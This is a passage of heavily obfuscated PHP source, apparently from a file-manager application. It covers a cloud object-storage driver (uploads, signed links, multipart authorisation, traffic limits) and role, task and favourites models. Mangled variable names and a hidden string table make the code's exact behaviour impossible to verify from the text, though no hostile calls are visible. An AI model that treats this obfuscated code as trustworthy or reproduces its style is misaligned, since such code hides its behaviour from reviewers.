$ˆÎ³É‚õ =& $_SERVER[£ğ°ÖØø]; $ë‡°“ş­ = empty($èØê¶Ÿå) ? $ˆÎ³É‚õ[1466] : $èØê¶Ÿå; $¯úâåÙ = array($ˆÎ³É‚õ[37], $ˆÎ³É‚õ[229], $ˆÎ³É‚õ[1465], $ˆÎ³É‚õ[1466]); if (!in_array($ë‡°“ş­, $¯úâåÙ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($í­¶òÈÎ), $ë‡°“ş­); } catch (OSS\Core\OssException $ÑŒ„¹î) { $this->writeLog(__FUNCTION__ . $ˆÎ³É‚õ[214] . $ÑŒ„¹î->getMessage()); return !1; } return !0; } public function getContent($Ÿ…›îˆ) { return $this->fileSubstr($Ÿ…›îˆ, -1); } public function setContent($›è¢†ëö, $«‹åŞ = '') { $ú¯ÆÀÖõ =& $_SERVER[£ğ°ÖØø]; try { $»ôÏë = $this->trafficLimit($ú¯ÆÀÖõ[1467]); $òÂõØíË = $this->client->putObject($this->bucket, $this->pathEncode($›è¢†ëö), $«‹åŞ, $»ôÏë); } catch (OSS\Core\OssException $ëúğÒè) { $this->writeLog(__FUNCTION__ . $ú¯ÆÀÖõ[214] . $ëúğÒè->getMessage()); return !1; } $°„âÀ­Ÿ = array($ú¯ÆÀÖõ[1461] => trim($òÂõØíË[$ú¯ÆÀÖõ[1458]], $ú¯ÆÀÖõ[121]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($›è¢†ëö))); $this->updateObjMeta($›è¢†ëö, $°„âÀ­Ÿ); return isset($òÂõØíË[$ú¯ÆÀÖõ[1468]][$ú¯ÆÀÖõ[292]]) ? !0 : !1; } private function updateObjMeta($¢âôÈØ¦, $™Ö¿õ§È) { $¢âôÈØ¦ = $this->pathEncode($¢âôÈØ¦); try { $ÆéºËÑ = array(OSS\OssClient::OSS_HEADERS => $™Ö¿õ§È); $this->client->copyObject($this->bucket, $¢âôÈØ¦, $this->bucket, $¢âôÈØ¦, $ÆéºËÑ); } catch (OSS\Core\OssException $¤´¤¤¡¤) { $this->writeLog(__FUNCTION__ . $_SERVER[£ğ°ÖØø][214] . $¤´¤¤¡¤->getMessage()); return !1; } return !0; } public function upload($»ÃÖœõ’, $óıš‚Á, $ÏÎ…å¸À = false, $Ş”Ü“‘¼ = REPEAT_REPLACE) { $Ü©ÇÙÌ¢ =& $_SERVER[£ğ°ÖØø]; $Õ®Å®Í = trim($»ÃÖœõ’, $Ü©ÇÙÌ¢[8]); $¿€îŒÀ‘ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($Ü©ÇÙÌ¢[1461] => @md5_file($óıš‚Á)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($»ÃÖœõ’))); $¿€îŒÀ‘ = $this->trafficLimit($Ü©ÇÙÌ¢[1467], $¿€îŒÀ‘); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($Õ®Å®Í), $óıš‚Á, $¿€îŒÀ‘); } catch (OSS\Core\OssException $êæ·Æˆ’) { $this->writeLog(__FUNCTION__ . $Ü©ÇÙÌ¢[214] . $êæ·Æˆ’->getMessage()); return !1; } return $this->getPathOuter($»ÃÖœõ’); } public function getHost() { $Â”‚ë‘³ =& $_SERVER[£ğ°ÖØø]; $’ ·¯ = explode($Â”‚ë‘³[210], parent::getHost()); return $’ ·¯[0] . $Â”‚ë‘³[210] . $this->bucket . $Â”‚ë‘³[10] . $’ ·¯[1]; } public function uploadFormData($Û‡ë˜æ, $Ô£§Ê€ = 3600) { $³±Ã‚œÓ =& $_SERVER[£ğ°ÖØø]; if (!($¦ ¦œÑ‡ = $this->getHost())) { return !1; } $Ç®ÙÍ¥± = $Ô£§Ê€; $Ö¿Ú™ÏÁ = date($³±Ã‚œÓ[1469], time() + $Ç®ÙÍ¥±); $ñöèŸß = new DateTime($Ö¿Ú™ÏÁ); $—šïé®‹ = $ñöèŸß->format(DateTime::ISO8601); $Ü¼—Ê†Ç = strpos($—šïé®‹, $³±Ã‚œÓ[372]); $—šïé®‹ = substr($—šïé®‹, 0, $Ü¼—Ê†Ç) . $³±Ã‚œÓ[1470]; $ú–ö ‘Ç = 1048576000 * 5; $§ÏïÖ®Ô = $this->pathFather($Û‡ë˜æ); $‹°»”‰¢ = array($³±Ã‚œÓ[275] => $—šïé®‹, $³±Ã‚œÓ[278] => array(array($³±Ã‚œÓ[1471], 0, $ú–ö ‘Ç), array($³±Ã‚œÓ[281], $³±Ã‚œÓ[282], $§ÏïÖ®Ô))); $é¡“ßªê = base64_encode(json_encode($‹°»”‰¢)); $ã«ÈËÚ˜ = base64_encode(hash_hmac($³±Ã‚œÓ[263], $é¡“ßªê, $this->secret, !0)); $ë¦èÇâÛ = array($³±Ã‚œÓ[293] => $é¡“ßªê, $³±Ã‚œÓ[1472] => $this->accessKey, $³±Ã‚œÓ[285] => $³±Ã‚œÓ[274], $³±Ã‚œÓ[1473] => $ã«ÈËÚ˜, $³±Ã‚œÓ[208] => $¦ ¦œÑ‡); $ë¦èÇâÛ = $this->trafficLimit($³±Ã‚œÓ[1467], $ë¦èÇâÛ); return $ë¦èÇâÛ; } public function multiUploadFormData($ûØÒ×ìª, $­íÀİâ = 3600) { $ÒÍòİÖ =& $_SERVER[£ğ°ÖØø]; if (!($¥ªêà = $this->getHost())) { return !1; } $ÎÔ„ƒ = $this->trafficLimit($ÒÍòİÖ[1467]); $ìŠ…ëµÌ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ûØÒ×ìª), $ÎÔ„ƒ); return array($ÒÍòİÖ[254] => $ìŠ…ëµÌ, $ÒÍòİÖ[208] => $¥ªêà . $ÒÍòİÖ[8] . $this->pathEncode($ûØÒ×ìª), $ÒÍòİÖ[255] => gmdate($ÒÍòİÖ[1474]), $ÒÍòİÖ[97] => $ûØÒ×ìª); } public function multiUploadAuthData($÷Úª¹òá, $ƒÓìÔ´ = array()) { $¢±Å§Ò² =& $_SERVER[£ğ°ÖØø]; $ÈŞğÌ½è = isset($ƒÓìÔ´[$¢±Å§Ò²[255]]) ? $ƒÓìÔ´[$¢±Å§Ò²[255]] : gmdate($¢±Å§Ò²[1474]); $õœüğ¤Ö = isset($ƒÓìÔ´[$¢±Å§Ò²[169]]) ? $ƒÓìÔ´[$¢±Å§Ò²[169]] : $¢±Å§Ò²[12]; $ñÅòÊ = $÷Úª¹òá; if (isset($ƒÓìÔ´[$¢±Å§Ò²[97]])) { $ñÅòÊ = $ƒÓìÔ´[$¢±Å§Ò²[97]]; unset($ƒÓìÔ´[$¢±Å§Ò²[97]]); } if (isset($ƒÓìÔ´[$¢±Å§Ò²[256]])) { $ƒÓìÔ´[$¢±Å§Ò²[255]] = $ÈŞğÌ½è; return $this->listUploadParts($ñÅòÊ, $ƒÓìÔ´); } $³ÃĞ˜àÃ = array($¢±Å§Ò²[257], $¢±Å§Ò²[12], $¢±Å§Ò²[123], $ÈŞğÌ½è, "\170\55\157\x73\x73\55\x64\141\164\145\72{$ÈŞğÌ½è}", $¢±Å§Ò²[8] . $this->bucket . $¢±Å§Ò²[8] . $ñÅòÊ . $õœüğ¤Ö); if (strpos($õœüğ¤Ö, $¢±Å§Ò²[258]) === 0) { $³ÃĞ˜àÃ[0] = $¢±Å§Ò²[259]; if ($Üè¯åÍ = $this->trafficLimit($¢±Å§Ò²[1467])) { $ñÅòÊ = $¢±Å§Ò²[1475]; array_splice($³ÃĞ˜àÃ, 5, 0, $ñÅòÊ . $¢±Å§Ò²[4] . $Üè¯åÍ[$ñÅòÊ]); } } if (isset($ƒÓìÔ´[$¢±Å§Ò²[260]]) && $ƒÓìÔ´[$¢±Å§Ò²[260]] == $¢±Å§Ò²[261]) { $³ÃĞ˜àÃ[0] = $¢±Å§Ò²[261]; } if (!empty($ƒÓìÔ´[$¢±Å§Ò²[1476]])) { $Î¸§™” = array_merge(array($³ÃĞ˜àÃ[4]), $ƒÓìÔ´[$¢±Å§Ò²[1476]]); sort($Î¸§™”); $³ÃĞ˜àÃ[4] = implode($¢±Å§Ò²[262], $Î¸§™”); } $Ç³Ê¬À = implode($¢±Å§Ò²[262], $³ÃĞ˜àÃ); $ìß“¹ô = base64_encode(hash_hmac($¢±Å§Ò²[263], $Ç³Ê¬À, $this->secret, !0)); $ƒï„ğ¶ù = $¢±Å§Ò²[1444] . $this->accessKey . $¢±Å§Ò²[4] . $ìß“¹ô; if (strpos($õœüğ¤Ö, $¢±Å§Ò²[258]) === 0) { $ƒï„ğ¶ù = array($¢±Å§Ò²[265] => $ƒï„ğ¶ù, $¢±Å§Ò²[255] => $ÈŞğÌ½è); if ($Üè¯åÍ) { $ƒï„ğ¶ù = array_merge($ƒï„ğ¶ù, $Üè¯åÍ); } } return $ƒï„ğ¶ù; } public function listUploadParts($÷ç ¶‹, $ÇçÏØ·‡) { $Ù‹éıÒ =& $_SERVER[£ğ°ÖØø]; $£úÓ¿¼ö = parse_url_query($ÇçÏØ·‡[$Ù‹éıÒ[169]]); $œà°«•À = $this->client->listParts($this->bucket, $this->pathEncode($÷ç ¶‹), $£úÓ¿¼ö[$Ù‹éıÒ[254]]); $Ä¹¿—©õ = $œà°«•À->getListPart(); $ºò¸›íã = array(); foreach ($Ä¹¿—©õ as $«¢éØù) { $ºò¸›íã[] = array($Ù‹éıÒ[308] => $«¢éØù->getPartNumber(), $Ù‹éıÒ[309] => trim($«¢éØù->getETag(), $Ù‹éıÒ[121])); } unset($ÇçÏØ·‡[$Ù‹éıÒ[256]], $ÇçÏØ·‡[$Ù‹éıÒ[260]]); $¢ğÌ«€§ = $this->multiUploadAuthData($÷ç ¶‹, $ÇçÏØ·‡); if (empty($¢ğÌ«€§)) { return !1; } return array($Ù‹éıÒ[265] => $¢ğÌ«€§, $Ù‹éıÒ[255] => $ÇçÏØ·‡[$Ù‹éıÒ[255]], $Ù‹éıÒ[267] => $ºò¸›íã); } public function download($ªˆ äùú, $°íá¦Î) { $°“­‰œ‹ =& $_SERVER[£ğ°ÖØø]; if ($this->isFolder($ªˆ äùú)) { return !1; } try { $²îî´â¾ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $°íá¦Î); $²îî´â¾ = $this->trafficLimit($°“­‰œ‹[112], $²îî´â¾); $this->client->getObject($this->bucket, $this->pathEncode($ªˆ äùú), $²îî´â¾); } catch (OSS\Core\OssException $›ñŸ á) { $this->writeLog(__FUNCTION__ . $°“­‰œ‹[214] . $›ñŸ á->getMessage()); return !1; } return $°íá¦Î; } public function fileSubstr($³úç÷Ğ¿, $‘ı×§Ô = 0, $×ƒìÍÂÄ = false) { if ($‘ı×§Ô === -1) { $Ìˆ½±§Ñ = array(); } else { if ($×ƒìÍÂÄ === !1) { $›÷¿çÂè = $this->size($³úç÷Ğ¿); } else { $›÷¿çÂè = $‘ı×§Ô + $×ƒìÍÂÄ - 1; } $Ìˆ½±§Ñ = array(OSS\OssClient::OSS_RANGE => "{$‘ı×§Ô}\55{$›÷¿çÂè}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($³úç÷Ğ¿), $Ìˆ½±§Ñ); } catch (OSS\Core\OssException $ø¹°ÖÁò) { $this->writeLog(__FUNCTION__ . $_SERVER[£ğ°ÖØø][214] . $ø¹°ÖÁò->getMessage()); think_exception($ø¹°ÖÁò->getMessage()); return !1; } } private function trafficLimit($¾æğ—°¦, $Û£İ €‘ = array()) { $ÉÏ€¶†† =& $_SERVER[£ğ°ÖØø]; if ($¾æğ—°¦ == $ÉÏ€¶††[1467] && $this->isUploadServer() || $¾æğ—°¦ == $ÉÏ€¶††[112] && $this->isFileOutServer()) { return $Û£İ €‘; } $™óüª€ = floatval($GLOBALS[$ÉÏ€¶††[6]][$ÉÏ€¶††[92]][$ÉÏ€¶††[110]][$¾æğ—°¦]) * 1024 * 1024 * 8; if (!$™óüª€) { return $Û£İ €‘; } $™óüª€ = $™óüª€ < 819200 ? 819200 : ($™óüª€ > 838860800 ? 838860800 : $™óüª€); $Û£İ €‘[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($™óüª€); return $Û£İ €‘; } public function link($·¨îÔöŸ, $Çœ¤ÕĞ = array()) { $¼ÅéèŠ =& $_SERVER[£ğ°ÖØø]; if (!$this->exist($·¨îÔöŸ) || $this->isFolder($·¨îÔöŸ)) { return !1; } try { $Çœ¤ÕĞ = $this->trafficLimit($¼ÅéèŠ[112], $Çœ¤ÕĞ); $ß’¶–ïÇ = $this->client->signUrl($this->bucket, $this->pathEncode($·¨îÔöŸ), 3600 * 12, $¼ÅéèŠ[261], $Çœ¤ÕĞ); return $this->getCdnLink($ß’¶–ïÇ); } catch (OSS\Core\OssException $ìÈ˜šş™) { $this->writeLog(__FUNCTION__ . $¼ÅéèŠ[214] . $ìÈ˜šş™->getMessage()); return !1; } } public function fileOut($àÖËàãò, $ø÷¹¬—Å = false, $•š–«¥® = false, $¬“ş„¿ = '') { $Ë²Æ’ìÌ =& $_SERVER[£ğ°ÖØø]; if ($this->isFileOutServer()) { return $this->fileOutServer($àÖËàãò, $ø÷¹¬—Å, $•š–«¥®, $¬“ş„¿); } if (!$•š–«¥®) { $•š–«¥® = $this->pathThis($àÖËàãò); } $•š–«¥® = rawurlencode($•š–«¥®); $ì·êÕšş = get_file_mime(get_path_ext($•š–«¥®)); if ($ì·êÕšş == $Ë²Æ’ìÌ[248]) { return parent::fileOut($àÖËàãò, $ø÷¹¬—Å, $•š–«¥®, $¬“ş„¿); } $ø÷¹¬—Å = $ø÷¹¬—Å ? $Ë²Æ’ìÌ[1477] : $Ë²Æ’ìÌ[1478]; $ñé°ªöÍ = array(OSS\OssClient::OSS_SUB_RESOURCE => $Ë²Æ’ìÌ[1479] . rawurlencode("{$ø÷¹¬—Å}\x3b\x66\x69\x6c\x65\156\x61\155\x65\x3d{$•š–«¥®}")); $ñé°ªöÍ[OSS\OssClient::OSS_SUB_RESOURCE] .= $Ë²Æ’ìÌ[1480] . rawurlencode($ì·êÕšş); $ˆèÙÈ¯Ô = $this->link($àÖËàãò, $ñé°ªöÍ); $this->fileOutLink($ˆèÙÈ¯Ô); } public function fileOutServer($ì €—Â¦, $óô™Ò­— = false, $÷šôÚÆ¶ = false, $‰¨Çö±… = '') { parent::fileOut($ì €—Â¦, $óô™Ò­—, $÷šôÚÆ¶, $‰¨Çö±…); } public function fileOutImage($İ–‘‚¶½, $¦÷çà†Î = 250) { if ($this->size($İ–‘‚¶½) > 1024 * 1024 * 20) { return $this->fileOutImageServer($İ–‘‚¶½, $¦÷çà†Î); } $¥ÜÇ¨ªç = array(OSS\OssClient::OSS_PROCESS => $_SERVER[£ğ°ÖØø][1441] . $¦÷çà†Î); $Ã»ä£Š· = $this->link($İ–‘‚¶½, $¥ÜÇ¨ªç); $this->fileOutLink($Ã»ä£Š·); } public function fileOutImageServer($å×‚†¤ú, $‹”„ø” = 250) { parent::fileOutImage($å×‚†¤ú, $‹”„ø”); } public function fileOutLink($˜œü›®µ) { $½×ÓùÜİ =& $_SERVER[£ğ°ÖØø]; if (!$this->isCdnHost() && substr($˜œü›®µ, 0, 7) == $½×ÓùÜİ[313]) { $˜œü›®µ = $½×ÓùÜİ[314] . substr($˜œü›®µ, 7); } header($½×ÓùÜİ[175] . $˜œü›®µ); die; } public function hashMd5($øÂôàë—, $¸‚áÄÓı = '') { $Î¿ãÑÂ =& $_SERVER[£ğ°ÖØø]; $‚šáİéï = $this->_objectMeta($øÂôàë—); if (!$‚šáİéï) { return $Î¿ãÑÂ[12]; } if (!isset($‚šáİéï[$Î¿ãÑÂ[1461]]) && !empty($¸‚áÄÓı)) { $’ñ¤º³î = $this->updateObjMeta($øÂôàë—, array($Î¿ãÑÂ[1461] => $¸‚áÄÓı)); $‚šáİéï[$Î¿ãÑÂ[1461]] = $’ñ¤º³î ? $¸‚áÄÓı : $Î¿ãÑÂ[12]; } return isset($‚šáİéï[$Î¿ãÑÂ[1461]]) ? strtolower($‚šáİéï[$Î¿ãÑÂ[1461]]) : $Î¿ãÑÂ[12]; } public function size($ËÑÕÄ±•) { $üÔ©¯€‚ = $this->objectMeta($ËÑÕÄ±•); return $üÔ©¯€‚ ? $üÔ©¯€‚[$_SERVER[£ğ°ÖØø][79]] : 0; } public function info($È’—øşä) { if ($this->isFolder($È’—øşä)) { return $this->folderInfo($È’—øşä); } else { if ($this->isFile($È’—øşä)) { return $this->fileInfo($È’—øşä); } } return !1; } public function exist($ç±ŠÃ±ˆ) { return $this->isFile($ç±ŠÃ±ˆ) || $this->isFolder($ç±ŠÃ±ˆ); } public function isFile($¿¿¿©‚ı) { return !$this->isFolder($¿¿¿©‚ı) && $this->objectMeta($¿¿¿©‚ı); } public function isFolder($ã–±™Öƒ) { return $this->cacheMethod($_SERVER[£ğ°ÖØø][179], $ã–±™Öƒ); } protected function objectMeta($ÕÚüöĞ•) { return $this->cacheMethod($_SERVER[£ğ°ÖØø][181], $ÕÚüöĞ•); } protected function _objectMeta($Úî¥Àı¿) { $Ğš´ÜÆĞ =& $_SERVER[£ğ°ÖØø]; try { $‰ÅãñÂ™ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($Úî¥Àı¿)); } catch (OSS\Core\OssException $“®¡•ú) { $this->writeLog(__FUNCTION__ . $Ğš´ÜÆĞ[214] . $“®¡•ú->getMessage()); $‰ÅãñÂ™ = !1; } if ($‰ÅãñÂ™) { $‰ÅãñÂ™[$Ğš´ÜÆĞ[79]] = intval($‰ÅãñÂ™[$Ğš´ÜÆĞ[1459]]); } return $‰ÅãñÂ™; } protected function _isFolder($ÙÌÊ¥) { $¨ ¦íş =& $_SERVER[£ğ°ÖØø]; if ($ÙÌÊ¥ == $¨ ¦íş[12] || $ÙÌÊ¥ == $¨ ¦íş[8]) { return !0; } $ª€µåÈÌ = array($¨ ¦íş[1454] => $¨ ¦íş[8], $¨ ¦íş[1455] => rtrim($ÙÌÊ¥, $¨ ¦íş[8]) . $¨ ¦íş[8], $¨ ¦íş[1456] => 1, $¨ ¦íş[1457] => $¨ ¦íş[12]); $Á½¾øº‘ = $this->client->listObjects($this->bucket, $ª€µåÈÌ); if ($Á½¾øº‘->getObjectList() || $Á½¾øº‘->getPrefixList()) { return !0; } return !1; } public function writeLog($ËøÒÕï = '', $¼¨Àûßœ = false) { $…ğ‘Õ˜æ =& $_SERVER[£ğ°ÖØø]; $ãœ“•£Á = in_array(ACTION, array($…ğ‘Õ˜æ[212], $…ğ‘Õ˜æ[213])); if (!$ãœ“•£Á && !GLOBAL_DEBUG) { return; } $Í¦ñÂİ¿ = 0; if (stripos($ËøÒÕï, $…ğ‘Õ˜æ[1481]) !== !1) { $Í¦ñÂİ¿ = 1; $‰Äñş«µ = explode($…ğ‘Õ˜æ[1482], $ËøÒÕï); $ËøÒÕï = !empty($‰Äñş«µ[1]) ? $‰Äñş«µ[1] : $ËøÒÕï; } else { if (stripos($ËøÒÕï, $…ğ‘Õ˜æ[1483])) { $Í¦ñÂİ¿ = 2; $‰Äñş«µ = explode($…ğ‘Õ˜æ[1483], $ËøÒÕï); $‰Äñş«µ = explode($…ğ‘Õ˜æ[4], $‰Äñş«µ[0]); $ËøÒÕï = !empty($‰Äñş«µ[1]) ? $‰Äñş«µ[1] : $ËøÒÕï; } } if ($ãœ“•£Á && I18n::getType() == $…ğ‘Õ˜æ[1484]) { if ($Í¦ñÂİ¿ == 1) { $ËøÒÕï = str_replace($…ğ‘Õ˜æ[1485], $…ğ‘Õ˜æ[1486], $ËøÒÕï); } else { if ($Í¦ñÂİ¿ == 2) { $‰Äñş«µ = explode($…ğ‘Õ˜æ[214], $‰Äñş«µ[0]); $øÊ·—¯¬ = isset($‰Äñş«µ[1]) ? $‰Äñş«µ[1] : $…ğ‘Õ˜æ[12]; $ª¬ûüÔ¬ = array($…ğ‘Õ˜æ[1487] => $…ğ‘Õ˜æ[1488], $…ğ‘Õ˜æ[1489] => $…ğ‘Õ˜æ[1490], $…ğ‘Õ˜æ[1491] => $…ğ‘Õ˜æ[1492], $…ğ‘Õ˜æ[1493] => $…ğ‘Õ˜æ[1494], $…ğ‘Õ˜æ[1495] => $…ğ‘Õ˜æ[1496], $…ğ‘Õ˜æ[1497] => $…ğ‘Õ˜æ[1498], $…ğ‘Õ˜æ[1499] => $…ğ‘Õ˜æ[1500], $…ğ‘Õ˜æ[1501] => $…ğ‘Õ˜æ[1502], $…ğ‘Õ˜æ[1503] => $…ğ‘Õ˜æ[1504], $…ğ‘Õ˜æ[1505] => $…ğ‘Õ˜æ[1506]); if (isset($ª¬ûüÔ¬[$øÊ·—¯¬])) { $ËøÒÕï = $ª¬ûüÔ¬[$øÊ·—¯¬]; } } } if (stripos($ËøÒÕï, $…ğ‘Õ˜æ[1507])) { $ËøÒÕï = $…ğ‘Õ˜æ[1508]; } } if (!trim($ËøÒÕï)) { return; } parent::writeLog(trim($ËøÒÕï), $¼¨Àûßœ); } } goto a¨æ¹½âäÕ; CŞî¢Äà‹„: class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\x6d\x2e\x72\x6f\154\x65\114\x69\163\x74"; public $field = array("\x6e\141\x6d\x65", "\x61\x75\164\150", "\154\141\x62\145\154", "\144\x69\x73\x70\x6c\141\x79", "\x73\171\x73\x74\145\155", "\x64\145\x73\x63", "\x69\x67\x6e\157\x72\145\x45\x78\164", "\x69\x67\156\x6f\x72\x65\106\151\x6c\145\123\x69\172\145", "\x61\x64\x6d\x69\x6e\x69\163\x74\162\141\x74\157\x72", "\x73\x6f\162\164"); public function listData($šÅã°» = false, $Ç×…¯Œ = "\163\157\162\164", $øÕ¥çÄÏ = false) { $†…ş½îÜ =& $_SERVER[£ğ°ÖØø]; $¥²¡íæ = parent::listData($šÅã°», $Ç×…¯Œ, $øÕ¥çÄÏ); if (!$šÅã°») { foreach ($¥²¡íæ as $Î­­ŠÀ” => $ô¿§˜Æß) { if ($ô¿§˜Æß[$†…ş½îÜ[2161]] == 1) { $¥²¡íæ[$Î­­ŠÀ”][$†…ş½îÜ[535]] = LNG($†…ş½îÜ[2422]); } } } return $¥²¡íæ; } public function update($ª¸ˆÎê, $¶§öº©í) { $¬£â×œ =& $_SERVER[£ğ°ÖØø]; $Ã¾ˆŞŠØ = parent::listData($ª¸ˆÎê); $¥˜ÚòÂ = $this->findByName($¶§öº©í[$¬£â×œ[32]]); if (!$Ã¾ˆŞŠØ || $¥˜ÚòÂ && $¥˜ÚòÂ[$¬£â×œ[484]] != $Ã¾ˆŞŠØ[$¬£â×œ[484]]) { return !1; } if ($¥˜ÚòÂ[$¬£â×œ[2161]] == 1) { $¶§öº©í = array($¬£â×œ[32] => $¶§öº©í[$¬£â×œ[32]], $¬£â×œ[1977] => $¶§öº©í[$¬£â×œ[1977]]); } $this->filterAuth($¶§öº©í[$¬£â×œ[496]]); return parent::update($ª¸ˆÎê, $¶§öº©í); } public function remove($‡Œ¸óãà) { $¬™ÅÍ­İ = parent::listData($‡Œ¸óãà); if (!$¬™ÅÍ­İ || $¬™ÅÍ­İ[$_SERVER[£ğ°ÖØø][191]]) { return !1; } return parent::remove($‡Œ¸óãà); } public function add($ö‚û“ä›) { $”£áŸ– =& $_SERVER[£ğ°ÖØø]; $Êú³ˆ‹’ = $ö‚û“ä›[$”£áŸ–[32]]; if ($this->findByName($Êú³ˆ‹’)) { return !1; } $ íùòä = array($”£áŸ–[503] => $Êú³ˆ‹’, $”£áŸ–[1960] => $”£áŸ–[12], $”£áŸ–[1956] => $”£áŸ–[1964], $”£áŸ–[2423] => 1, $”£áŸ–[1959] => 0, $”£áŸ–[2424] => 0, $”£áŸ–[1958] => $this->getSort()); $ö‚û“ä› = array_merge($ íùòä, $ö‚û“ä›); $this->filterAuth($ö‚û“ä›[$”£áŸ–[496]]); return parent::insert($ö‚û“ä›); } private function getSort() { $¨ßµ¯£† =& $_SERVER[£ğ°ÖØø]; $ĞŞĞÔÔÍ = parent::listData(); $¯Ë÷Îš = array_to_keyvalue($ĞŞĞÔÔÍ, $¨ßµ¯£†[12], $¨ßµ¯£†[1978]); return empty($¯Ë÷Îš) ? 0 : max($¯Ë÷Îš) + 1; } private function filterAuth(&$Éå¥ÓÆá) { $Œ¾¥ó‰ =& $_SERVER[£ğ°ÖØø]; $¼ìÄşÁ½ = array(); $˜ÖƒˆèŸ = array_filter(explode($Œ¾¥ó‰[50], $Éå¥ÓÆá)); foreach ($˜ÖƒˆèŸ as $Éå¥ÓÆá) { $ÊíÉ­³ = explode($Œ¾¥ó‰[10], $Éå¥ÓÆá); if ($ÊíÉ­³[0] == $Œ¾¥ó‰[2425] && $ÊíÉ­³[1] != $Œ¾¥ó‰[1258]) { $¬¿ÙĞ¡… = $ÊíÉ­³[0] . $Œ¾¥ó‰[10] . $ÊíÉ­³[1] . $Œ¾¥ó‰[2426]; if (!in_array($¬¿ÙĞ¡…, $˜ÖƒˆèŸ)) { $¼ìÄşÁ½[] = $¬¿ÙĞ¡…; } } $¼ìÄşÁ½[] = $Éå¥ÓÆá; } $Éå¥ÓÆá = implode($Œ¾¥ó‰[50], $¼ìÄşÁ½); } public function findRoleDefault() { $›š‡²ü‚ =& $_SERVER[£ğ°ÖØø]; $ŠÏ†“îĞ = parent::listData(); $âİï«ûÓ = !1; foreach ($ŠÏ†“îĞ as $ˆÉë’“) { if (!$ˆÉë’“ || $ˆÉë’“[$›š‡²ü‚[1976]] == $›š‡²ü‚[228] || $ˆÉë’“[$›š‡²ü‚[2161]] == 1) { continue; } if (strstr($ˆÉë’“[$›š‡²ü‚[496]], $›š‡²ü‚[2427])) { continue; } if (!strstr($ˆÉë’“[$›š‡²ü‚[496]], $›š‡²ü‚[2428])) { continue; } if (!$âİï«ûÓ) { $âİï«ûÓ = $ˆÉë’“; continue; } $Îºª•²¶ = explode($›š‡²ü‚[50], $âİï«ûÓ[$›š‡²ü‚[496]]); $ öûÍÎ = explode($›š‡²ü‚[50], $ˆÉë’“[$›š‡²ü‚[496]]); if (count($Îºª•²¶) > count($ öûÍÎ)) { $âİï«ûÓ = $ˆÉë’“; } } return $âİï«ûÓ ? $âİï«ûÓ[$›š‡²ü‚[484]] : $›š‡²ü‚[12]; } public function sort($ºŒ Îã, $¬³Ã¦Ò) { return parent::update($ºŒ Îã, $¬³Ã¦Ò); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\155\x2e\x74\141\x73\x6b\114\151\163\164"; public $field = array("\156\141\155\145", "\x74\x79\x70\145", "\x65\x76\x65\x6e\x74", "\x74\151\x6d\145", "\144\145\x73\x63", "\x73\x79\163\x74\145\x6d", "\145\156\x61\142\x6c\145", "\x6c\x61\163\x74\x52\x75\x6e", "\163\x6f\x72\x74"); public function listData($Ôˆ£™¢¹ = false, $–€½åúã = "\x73\x6f\x72\x74", $ªí›û»Ò = false) { return parent::listData($Ôˆ£™¢¹, $–€½åúã, $ªí›û»Ò); } public function add($×ÄÚñÀ°) { $¾Ú›ñÒ² =& $_SERVER[£ğ°ÖØø]; $ÀØ²âÔù = $this->findByName($×ÄÚñÀ°[$¾Ú›ñÒ²[32]]); if ($ÀØ²âÔù) { return !1; } $×ÄÚñÀ°[$¾Ú›ñÒ²[1706]] = 0; $×ÄÚñÀ°[$¾Ú›ñÒ²[1978]] = $this->getSort(); return parent::insert($×ÄÚñÀ°); } private function getSort() { $âĞß±§Ç =& $_SERVER[£ğ°ÖØø]; $Ò¯ø¤ÙÀ = parent::listData(); $°„¹«İµ = array_to_keyvalue($Ò¯ø¤ÙÀ, $âĞß±§Ç[12], $âĞß±§Ç[1978]); return empty($°„¹«İµ) ? 0 : max($°„¹«İµ) + 1; } public function update($ûâÔ£¹õ, $·ß¨ı†í) { $ûÜ¹ë¥ç =& $_SERVER[£ğ°ÖØø]; $«™«ñƒ = $this->listData($ûâÔ£¹õ); $ˆÍÍ…°ğ = $this->findByName($·ß¨ı†í[$ûÜ¹ë¥ç[32]]); if (!$«™«ñƒ || $ˆÍÍ…°ğ && $ˆÍÍ…°ğ[$ûÜ¹ë¥ç[484]] != $«™«ñƒ[$ûÜ¹ë¥ç[484]]) { return !1; } return parent::update($ûâÔ£¹õ, $·ß¨ı†í); } public function remove($ˆùå‰ßñ, $ëè¼¬Èª = false) { $—‰Ñ²Õ¦ =& $_SERVER[£ğ°ÖØø]; $‚øü›“™ = $this->listData($ˆùå‰ßñ); if (!$‚øü›“™) { return; } if (!$ëè¼¬Èª && $‚øü›“™[$—‰Ñ²Õ¦[191]] == $—‰Ñ²Õ¦[91]) { return !1; } return parent::remove($ˆùå‰ßñ); } public function enable($ñßä†„, $ßŒŠÇ¥È) { return $this->update($ñßä†„, array($_SERVER[£ğ°ÖØø][2417] => $ßŒŠÇ¥È)); } public function run($»’˜ö²) { return $this->update($»’˜ö², array($_SERVER[£ğ°ÖØø][2429] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\x73\145\162\137\146\x61\166"; protected function cacheFunctionAlias($€ÍŠ¿Ï) { $Êì¾¥¿® =& $_SERVER[£ğ°ÖØø]; return array($Êì¾¥¿®[2069] => array(USER_ID, $Êì¾¥¿®[2430])); } protected function listData() { $ıøÉåÂ =& $_SERVER[£ğ°ÖØø]; $¬²ÌÎÒ‰ = array($ıøÉåÂ[1746] => USER_ID, $ıøÉåÂ[566] => 0); $×ı½Ó = $ıøÉåÂ[2431]; $òÅŸ®Ö = $this->field($×ı½Ó)->where($¬²ÌÎÒ‰)->order($ıøÉåÂ[2432])->select(); return $òÅŸ®Ö ? $òÅŸ®Ö : array(); } protected function resetCache() { } protected function listView() { $«‚ß¡Ì =& 